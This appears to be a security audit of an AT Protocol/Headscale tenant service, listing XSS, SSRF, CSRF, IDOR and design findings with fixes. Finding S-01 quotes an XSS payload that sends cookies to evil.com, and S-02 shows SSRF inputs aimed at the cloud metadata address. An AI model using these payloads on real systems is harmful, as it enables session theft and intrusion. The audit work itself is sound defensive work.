# Codebase Audit — atproto-tailnet

**Date:** 2026-10-23
**Scope:** Every file in `src/`, all ADRs (0001–0004), BUILD_PLAN.md, CLAUDE.md, docker-compose.yml, Caddyfile, drizzle config/migrations, `.env`/`.env.example`

---

## 1. Security Findings

### S-01: Stored XSS via User-Controlled Data in Dashboard HTML

**Severity:** CRITICAL
**File:** `src/routes/dashboard.ts`, lines 314–483
**Description:** The inline SPA renders user-controlled data — handles, display names, tenant names, avatar URLs, device names, IP addresses, and auth key commands — directly into HTML via string concatenation with no escaping. An attacker could set their Bluesky display name to `<img src=x onerror="fetch('https://evil.com/'+document.cookie)">` and execute arbitrary JavaScript in every dashboard that displays their name (e.g., member lists, invitation lists).

Affected render paths:
- `renderDevices()` — `d.name`, `d.user`, `d.ipAddresses` (lines 317–321)
- `renderMembers()` — `m.avatarUrl`, `m.displayName`, `m.handle` (lines 331–335)
- `renderInvitationsReceived()` — `inv.tenantName`, `inv.inviterDisplayName`, `inv.inviterHandle` (lines 349–351)
- `renderDashboard()` — `state.user.avatarUrl`, `state.user.handle` (lines 367–368)
- `renderTenantView()` — `t.name` (lines 381, 396)
- `generateAuthKey()` — `result.command` (line 483)

**Suggested fix:** Add an HTML escape function and use it on every interpolated value:
```javascript
function esc(s) {
  const d = document.createElement('div');
  d.textContent = s;
  return d.innerHTML;
}
```
Apply `esc()` to every user-controlled string before concatenation. For `img src` attributes, also validate the URL starts with `https://`.

---

### S-02: SSRF via Handle Resolution

**Severity:** HIGH
**File:** `src/routes/invitations.ts`, lines 23–31
**Description:** The `resolveHandleToDid()` function takes a user-supplied handle and makes an HTTP request to `https://${cleanHandle}/.well-known/atproto-did`. The only sanitization is stripping a leading `@`. An attacker could supply a handle like `169.254.169.254/latest/meta-data#` or `internal-service.local:8080/path#` to make the server fetch arbitrary URLs (the `#` causes the `.well-known/atproto-did` suffix to become a fragment).

More subtly, a handle like `localhost:3000` would make the server send requests to itself, potentially hitting internal endpoints.

**Suggested fix:** Validate that the handle matches the AT Protocol handle format before making any requests:
```typescript
const HANDLE_RE = /^([a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$/;
if (!HANDLE_RE.test(cleanHandle)) {
  return null; // or throw
}
```
Additionally, consider using the `@atproto/api` handle resolution functions which include proper validation.

---

### S-03: Headscale Ports Bound to All Interfaces (0.0.0.0)

**Severity:** HIGH
**File:** `src/orchestrator/headscale.ts`, lines 124–126
**Description:** Docker port bindings do not specify a `HostIp`, causing Headscale instances to be accessible on all network interfaces. This means:
1. The Headscale REST API is directly reachable from the network (bypassing Caddy).
2. The Tailscale control protocol is exposed externally on raw ports (10001–10100).
3. An attacker with network access can probe/attack Headscale instances directly.

The docker-compose.yml correctly binds Caddy and PostgreSQL to `127.0.0.1`, but the programmatically-created containers do not.

**Suggested fix:** Add `HostIp: "127.0.0.1"` to the port binding:
```typescript
PortBindings: {
  "8080/tcp": [{ HostIp: "127.0.0.1", HostPort: String(port) }],
},
```

---

### S-04: No CSRF Protection

**Severity:** HIGH
**File:** `src/index.ts` (entire app)
**Description:** The application has no CSRF mitigation. State-changing endpoints (`POST /auth/logout`, `POST /api/tenants/:id/invitations`, `POST /api/invitations/:id/accept`, `DELETE` routes) accept requests without any CSRF token. While JSON `Content-Type` requirement provides partial mitigation (browsers won't send JSON from form submissions), it can be bypassed with `fetch()` from a malicious page if there's no `SameSite` cookie attribute.

**Suggested fix:**
1. Add `sameSite: 'lax'` to the cookie configuration (immediate fix).
2. For Phase 4 production: add a proper CSRF token library (e.g., `csrf-csrf` or `csurf` successor).

---

### S-05: Missing `sameSite` Cookie Attribute

**Severity:** HIGH
**File:** `src/index.ts`, lines 19–22
**Description:** The session cookie configuration sets `httpOnly` and conditionally `secure`, but does not set `sameSite`. Without this, the cookie may be sent on cross-origin requests, enabling CSRF attacks against all state-changing endpoints.

**Suggested fix:**
```typescript
cookie: {
  secure: config.publicUrl.startsWith("https"),
  httpOnly: true,
  sameSite: "lax",
  maxAge: 7 * 24 * 60 * 60 * 1000,
},
```

---

### S-06: Session Secret Has No Minimum Strength Validation

**Severity:** MEDIUM
**File:** `src/config.ts`, line 11
**Description:** The `sessionSecret` config field has a default of `"dev-secret-change-me"` and no minimum length or entropy validation. In production, if an operator forgets to change it (or sets a weak value), session cookies can be forged by anyone who guesses the secret.

**Suggested fix:** Add a Zod refinement for non-localhost deployments:
```typescript
sessionSecret: z.string().min(32, "Session secret must be at least 32 characters"),
```
Or validate at startup that the secret is not one of the known defaults.

---

### S-07: IDOR on Tenant Invitations Endpoint

**Severity:** MEDIUM
**File:** `src/routes/api.ts`, lines 69–76
**Description:** `GET /api/tenants/:id/invitations` requires authentication but does NOT verify that the requesting user is a member of the specified tenant. Any authenticated user who knows (or guesses) a tenant UUID can view all invitations for that tenant, including invitee handles and DIDs.

**Suggested fix:** Add a membership check before returning data:
```typescript
const [membership] = await db
  .select()
  .from(memberships)
  .where(and(eq(memberships.tenantId, tenantId), eq(memberships.userId, req.session.userId!)));
if (!membership) {
  res.status(404).json({ error: "Tenant not found" });
  return;
}
```

---

### S-08: No Rate Limiting on Any Endpoint

**Severity:** MEDIUM
**File:** `src/index.ts` (entire app)
**Description:** There is no rate limiting on any endpoint. This enables:
- Brute-force handle enumeration via `/auth/login`
- Invitation spam via `POST /api/tenants/:id/invitations`
- Resource exhaustion via rapid tenant provisioning (each creates a Docker container)
- Handle resolution abuse (each invite triggers external HTTP requests)

BUILD_PLAN.md acknowledges this as Phase 4 work (line 125: "Rate limiting, CSRF protection").

**Suggested fix:** Add `express-rate-limit` with sensible defaults for auth endpoints (e.g., 10 attempts/minute) and API endpoints (e.g., 60 requests/minute).

---

### S-09: Race Condition in Port Allocation

**Severity:** MEDIUM
**File:** `src/orchestrator/ports.ts` + `src/routes/auth.ts`, lines 25–37
**Description:** `allocatePort()` reads all used ports from the DB, then the caller inserts a tenant with that port. These operations are not in a transaction. Under concurrent registration, two requests could both read the same port as available, and both attempt to INSERT. The `UNIQUE` constraint on `tenants.port` would cause the second to fail with an unhandled DB error (500 to the user).

**Suggested fix:** Wrap port allocation + tenant insert in a serializable transaction, or use `SELECT ... FOR UPDATE` / advisory locks. At minimum, catch the unique constraint violation and retry.

---

### S-10: Async Provisioning Error Not Propagated

**Severity:** MEDIUM
**File:** `src/routes/auth.ts`, lines 46–83
**Description:** The `setImmediate()` async callback catches errors and sets tenant status to "error", but there is no mechanism to notify the user what went wrong. The dashboard shows a generic "Something went wrong" message. If Docker is unavailable or the Headscale image is not pulled, the user gets stuck with an "error" tenant and no way to retry or understand the issue.

Additionally, unhandled promise rejections inside `setImmediate` could crash the process in strict environments, since the async callback returns a promise that nobody awaits.

**Suggested fix:** Wrap the setImmediate callback body in a try/catch that logs the full error. Consider using a proper job queue (e.g., `p-queue`) instead of `setImmediate` for better error handling and retry.

---

### S-11: Member Removal Does Not Clean Up Headscale

**Severity:** MEDIUM
**File:** `src/routes/devices.ts`, lines 183–212
**Description:** `DELETE /api/tenants/:tenantId/members/:userId` deletes the membership record from PostgreSQL but does NOT remove the user or their devices from the Headscale instance. Removed members' devices remain connected to the tailnet and can continue to communicate.

**Suggested fix:** After deleting the membership, use the HeadscaleApiClient to:
1. List and delete all nodes belonging to the removed user's Headscale username.
2. Optionally delete the Headscale user itself.

---

### S-12: Internal Port Leaked in API Responses

**Severity:** LOW
**File:** `src/routes/api.ts`, lines 32–43 and 59–67
**Description:** `GET /api/tenants` and `GET /api/tenants/:id` include the `port` field in their responses. This is an internal infrastructure detail (the host port where the Headscale Docker container is bound). Leaking this information helps an attacker directly target Headscale instances (especially combined with S-03 where ports are bound to all interfaces).

**Suggested fix:** Remove `port` from the API response. The client-facing `loginServer` URL should use the Caddy subdomain, not `localhost:PORT`.

---

### S-13: Login Server URL Uses localhost Instead of Caddy Subdomain

**Severity:** LOW
**File:** `src/routes/api.ts`, line 66; `src/routes/devices.ts`, line 105
**Description:** The `loginServer` URL returned to clients is `http://localhost:${port}`, which only works in local development. In production, this should be `https://${slug}.${baseDomain}` so Tailscale clients connect via the Caddy reverse proxy.

**Suggested fix:** Generate the login server URL from the tenant slug and base domain:
```typescript
const loginServer = `${config.publicUrl.startsWith('https') ? 'https' : 'http'}://${tenant.slug}.${config.baseDomain}`;
```

---

## 2. ADR Compliance Findings

### A-01: ADR-0002 — Tenant Deletion Cleanup Not Implemented

**Severity:** HIGH
**File:** `src/orchestrator/headscale.ts` (destroyInstance, line 156); no route calls it
**Description:** ADR-0004 specifies the `delete_tenant` flow as:
1. Stop and remove Docker container
2. Remove Caddy upstream
3. Optionally archive data volume
4. Mark tenant as deleted in PostgreSQL

Only step 1 is implemented (`destroyInstance`), and it is never called from any route. Steps 2–4 are not implemented at all. There is no tenant deletion endpoint. `removeTenantRoute()` exists in `caddy.ts` but is never called. The data directory on the host filesystem is never cleaned up.

**Suggested fix:** Implement a `DELETE /api/tenants/:id` route that:
1. Calls `destroyInstance(containerId)`
2. Calls `removeTenantRoute(slug)`
3. Optionally archives/removes `${dataDir}/${slug}`
4. Updates tenant status to "deleted" in PostgreSQL

---

### A-02: ADR-0003 — DNS TXT Resolution Not Implemented

**Severity:** MEDIUM
**File:** `src/routes/invitations.ts`, lines 21–48
**Description:** ADR-0003 states handle resolution works via "DNS TXT or HTTP." The code has a comment saying "Try DNS TXT _atproto.<handle>" (line 21) but the implementation only uses:
1. HTTP `/.well-known/atproto-did` (line 23–30)
2. Bluesky public API fallback (line 33–47)

DNS TXT resolution is not implemented. Self-hosted PDS users who use DNS TXT records for handle verification (without HTTP) would not be resolvable.

**Suggested fix:** Add DNS TXT resolution using Node's `dns.resolveTxt()`:
```typescript
import { resolveTxt } from 'node:dns/promises';
const records = await resolveTxt(`_atproto.${cleanHandle}`);
const didRecord = records.flat().find(r => r.startsWith('did='));
```

---

### A-03: ADR-0004 — gRPC/REST API vs CLI Exec Inconsistency

**Severity:** MEDIUM
**File:** `src/orchestrator/headscale.ts` (CLI exec), `src/orchestrator/headscale-api.ts` (REST client)
**Description:** ADR-0004 says the service communicates with Headscale via "gRPC API (and REST via grpc-gateway)" with "instance-specific API key." In practice, the codebase uses two different methods:

- **CLI exec (via `docker exec`):** Creating API keys (line 133), creating users (line 146, 192), creating pre-auth keys (line 201)
- **REST API (via `HeadscaleApiClient`):** Listing nodes, deleting nodes, renaming nodes, setting policy, healthcheck

This dual-path approach means some operations go through the REST API (which requires the API key) and some bypass it entirely via CLI exec (which has full admin access inside the container). The REST client has methods for `createUser` and `createPreAuthKey` that are never used — the CLI exec versions are used instead.

**Suggested fix:** Consolidate on the REST API client. After the API key is created via CLI exec (necessary bootstrap), all subsequent operations should use `HeadscaleApiClient`. Remove or deprecate the CLI exec helper functions for user/key creation.

---

### A-04: ADR-0001 — Headscale Image Version Is Correctly Pinned

**Severity:** N/A (PASS)
**File:** `.env`, line 12; `src/config.ts`, line 14
**Description:** ADR-0001 references Headscale v0.29.1. The config defaults to `headscale/headscale:0.29.1` and the `.env` file matches. The image tag is pinned, not floating (e.g., not `:latest`).

---

### A-05: ADR-0003 — BFF Pattern Correctly Implemented

**Severity:** N/A (PASS)
**File:** `src/auth/atproto.ts`, `src/routes/auth.ts`
**Description:** ADR-0003 requires the BFF pattern: all tokens server-side, browser gets HTTP-only cookies. The implementation correctly stores OAuth sessions in the in-memory session store (server-side), and the browser only receives an `express-session` cookie with `httpOnly: true`. No AT Proto tokens are ever sent to the client.

---

### A-06: ADR-0004 — Architecture Matches Diagram

**Severity:** N/A (PASS with caveats)
**File:** All source files
**Description:** The architecture matches the ADR-0004 diagram: Express service on :3000, PostgreSQL for service state, Docker containers for Headscale instances, Caddy for reverse proxy. The caveats are the incomplete Caddy integration (A-01) and the dual API path (A-03).

---

## 3. Composability/Consistency Findings

### C-01: `ensureCaddyBaseConfig()` Is Dead Code

**Severity:** MEDIUM
**File:** `src/orchestrator/caddy.ts`, lines 39–64
**Description:** `ensureCaddyBaseConfig()` is defined but never imported or called anywhere. The initial Caddy configuration comes from the `Caddyfile` mounted in docker-compose.yml. If the application is deployed without the Caddyfile (or with a different reverse proxy setup), the Caddy admin API routes would have no base server config and `addTenantRoute()` would fail.

**Suggested fix:** Either:
1. Call `ensureCaddyBaseConfig()` at startup in `src/index.ts` (replacing the Caddyfile-based approach), or
2. Remove it and document that the Caddyfile is the source of truth for base config.

---

### C-02: `removeTenantRoute()` and `destroyInstance()` Are Dead Code

**Severity:** MEDIUM
**File:** `src/orchestrator/caddy.ts` line 91; `src/orchestrator/headscale.ts` line 156
**Description:** Both functions are defined and exported but never imported or called from any route handler. This means:
- Caddy routes accumulate forever and are never cleaned up
- Docker containers are never destroyed (they restart via `unless-stopped` policy)

This is directly related to A-01 (no tenant deletion flow).

**Suggested fix:** Implement the tenant deletion route that calls both functions.

---

### C-03: `CADDY_ADMIN_URL` Bypasses Config Validation

**Severity:** LOW
**File:** `src/orchestrator/caddy.ts`, lines 3–4
**Description:** The `CADDY_ADMIN_URL` environment variable is read directly from `process.env` instead of going through the Zod-validated config in `src/config.ts`. All other environment variables go through the config schema. This inconsistency means:
- The Caddy URL has no type validation
- It won't appear in config type definitions
- A missing value silently falls back to `http://localhost:2019`

**Suggested fix:** Add `caddyAdminUrl` to the config schema:
```typescript
caddyAdminUrl: z.string().url().default("http://localhost:2019"),
```

---

### C-04: Duplicate Tenant Lookup Logic

**Severity:** LOW
**File:** `src/routes/devices.ts` (getTenantForUser, line 11); `src/routes/api.ts` (inline, line 47–53)
**Description:** `devices.ts` has a well-factored `getTenantForUser()` helper that checks membership. `api.ts` has a similar inline query in `GET /api/tenants/:id` that does the same thing but differently (and with the IDOR bug noted in S-07). `invitations.ts` also has its own inline membership checks.

**Suggested fix:** Extract `getTenantForUser()` into `routes/helpers.ts` and reuse it across all route files.

---

### C-05: Inconsistent Error Handling Patterns

**Severity:** LOW
**File:** Various route files
**Description:** Error handling is inconsistent across routes:
- `devices.ts` wraps Headscale API calls in try/catch and returns 502 (good)
- `api.ts` does not catch Headscale API errors
- `invitations.ts` catch blocks in `resolveHandleToDid` silently swallow errors
- `auth.ts` logs errors but returns generic 500
- `caddy.ts` catches and logs but doesn't propagate errors (silent failures)

**Suggested fix:** Establish a consistent error handling pattern:
1. Wrap all external service calls (Headscale, Caddy, AT Proto) in try/catch
2. Return appropriate HTTP status codes (502 for upstream failures, 500 for internal)
3. Log the full error server-side, return a sanitized message to the client

---

### C-06: Dashboard JS Does Not Handle All Error Cases

**Severity:** LOW
**File:** `src/routes/dashboard.ts`, lines 250–263
**Description:** The `api()` helper function in the dashboard JS:
- Handles 401 by re-rendering the login page (good)
- Handles non-OK responses by showing a toast (good)
- But does NOT handle network errors (fetch rejection) — if the server is down, the promise rejects and the error goes to the console with no user feedback
- Does not handle JSON parse failures

**Suggested fix:** Wrap the `api()` function in a try/catch:
```javascript
async function api(path, opts) {
  try {
    const res = await fetch(path, { ... });
    // existing logic
  } catch (e) {
    toast('Network error — check your connection');
    return null;
  }
}
```

---

### C-07: Slug Generation Can Collide

**Severity:** LOW
**File:** `src/routes/auth.ts`, lines 19–22
**Description:** Tenant slugs are generated by replacing non-alphanumeric characters with hyphens. Handles like `alice.bsky.social` and `alice-bsky-social` produce the same slug `alice-bsky-social`. The DB's unique constraint catches this, but the error surfaces as an unhandled 500 rather than a meaningful message.

**Suggested fix:** Catch unique constraint errors on slug and append a numeric suffix (e.g., `alice-bsky-social-2`).

---

### C-08: HeadscaleApiClient Has Unused Methods

**Severity:** LOW
**File:** `src/orchestrator/headscale-api.ts`
**Description:** Several methods in the REST API client are defined but never called:
- `createUser()` — CLI exec is used instead
- `createPreAuthKey()` — CLI exec is used instead
- `listUsers()` — never called
- `deleteUser()` — never called
- `getNode()` — never called
- `renameNode()` — never called
- `healthcheck()` — never called

These are useful API surface area, but having two code paths for the same operation (REST vs CLI) creates confusion about which to use.

**Suggested fix:** Migrate callers to use the REST API methods after initial bootstrap, and remove the CLI exec alternatives.

---

### C-09: `db/index.ts` Reads DATABASE_URL Directly

**Severity:** LOW
**File:** `src/db/index.ts`, lines 5–8
**Description:** The database connection reads `DATABASE_URL` directly from `process.env` with a fallback, duplicating the logic in `config.ts`. If someone sets a different `DATABASE_URL` in config vs environment, the two could diverge.

**Suggested fix:** Import `config` and use `config.databaseUrl`:
```typescript
import { config } from "../config.js";
const pool = new pg.Pool({ connectionString: config.databaseUrl });
```

---

## 4. Completeness Findings

### P-01: No Tenant Deletion API

**Severity:** HIGH
**File:** No file (missing)
**Description:** BUILD_PLAN.md Phase 2 and ADR-0004 describe a `delete_tenant` flow, but no route implements it. The `destroyInstance()` and `removeTenantRoute()` functions exist but are never wired up.

**Suggested fix:** Add `DELETE /api/tenants/:id` restricted to owners.

---

### P-02: No Tenant Start/Stop/Restart API

**Severity:** MEDIUM
**File:** `src/orchestrator/headscale.ts` (startInstance/stopInstance defined, never called)
**Description:** `startInstance()` and `stopInstance()` are exported but never called from any route. BUILD_PLAN Phase 4.2 lists "Graceful shutdown/restart" but there's no route to trigger these operations.

**Suggested fix:** Add `POST /api/tenants/:id/start` and `POST /api/tenants/:id/stop` routes.

---

### P-03: Auth State/Session Stores Are In-Memory Only

**Severity:** MEDIUM
**File:** `src/auth/atproto.ts`, lines 18–31; CLAUDE.md line 29
**Description:** Both the OAuth state store and session store use in-memory `Map` objects. This means:
- Server restart loses all OAuth sessions (users must re-authenticate)
- Cannot scale to multiple server instances
- Memory grows unbounded (no TTL or cleanup for stale entries)

CLAUDE.md acknowledges this ("swap to DB-backed for production"). BUILD_PLAN lists "Production deployment" as Phase 4.

**Suggested fix:** For immediate improvement, add a periodic cleanup of expired entries. For production, implement DB-backed stores using the existing PostgreSQL connection.

---

### P-04: No `.well-known` Endpoints for Production OAuth

**Severity:** LOW
**File:** No file (missing)
**Description:** ADR-0003 requires production deployment to host:
- `/.well-known/atproto-client-metadata.json`
- `/.well-known/jwks.json` (JWKS endpoint)

Neither endpoint is implemented. The production code path in `atproto.ts` references these URLs (lines 70, 79) but they are not served by any route. The Caddy reverse proxy would need to route these too.

BUILD_PLAN Phase 4.3 lists these as TODO.

**Suggested fix:** Add Express routes to serve these endpoints, or serve them as static files via Caddy.

---

### P-05: No Health Check Endpoint

**Severity:** LOW
**File:** No file (missing)
**Description:** There is no `/health` or `/readiness` endpoint for the service itself. This would be needed for production deployment behind a load balancer or in Kubernetes.

**Suggested fix:** Add a simple `GET /health` route that checks DB connectivity.

---

## 5. Summary

| Severity | Count | IDs |
|----------|-------|-----|
| CRITICAL | 1 | S-01 |
| HIGH | 5 | S-02, S-03, S-04, S-05, A-01 |
| MEDIUM | 9 | S-06, S-07, S-08, S-09, S-10, S-11, A-02, A-03, C-01 |
| LOW | 10 | S-12, S-13, C-02, C-03, C-04, C-05, C-06, C-07, C-08, C-09 |
| Completeness | 5 | P-01, P-02, P-03, P-04, P-05 |
| Pass | 3 | A-04, A-05, A-06 |

### Fix Status (2026-10-23)

**All 30 findings fixed.**

S-01, S-02, S-03, S-04, S-05, S-06, S-07, S-08, S-09, S-10, S-11, S-12, S-13,
A-01, A-02, A-03, C-01, C-02, C-03, C-04, C-05, C-06, C-07, C-08, C-09,
P-01, P-02, P-03, P-04, P-05

Phase 4 items now resolved:
- S-08: Rate limiting via `express-rate-limit` — auth 10/min, API 60/min
- S-09: Port race condition — retry loop catches PostgreSQL 23505 (unique violation), re-allocates up to 3 times
- P-03: OAuth state/session stores backed by PostgreSQL (`oauth_states`, `oauth_sessions` tables); express-session backed by `connect-pg-simple`
- P-04: `GET /.well-known/atproto-client-metadata.json` and `GET /.well-known/jwks.json` served by authRouter
